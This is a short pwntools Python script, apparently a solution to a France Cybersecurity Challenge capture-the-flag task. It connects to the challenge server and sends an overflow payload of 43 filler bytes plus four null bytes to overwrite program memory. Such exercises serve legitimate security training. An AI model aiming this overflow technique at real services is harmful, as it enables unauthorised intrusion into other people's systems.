from pwn import *

def flush():
    log.info(p.clean().decode().strip())

p = remote('challenges.france-cybersecurity-challenge.fr', 2100)
payload = flat(b'A' * 43, b'\0'*4)
flush(); p.sendline(payload); flush()
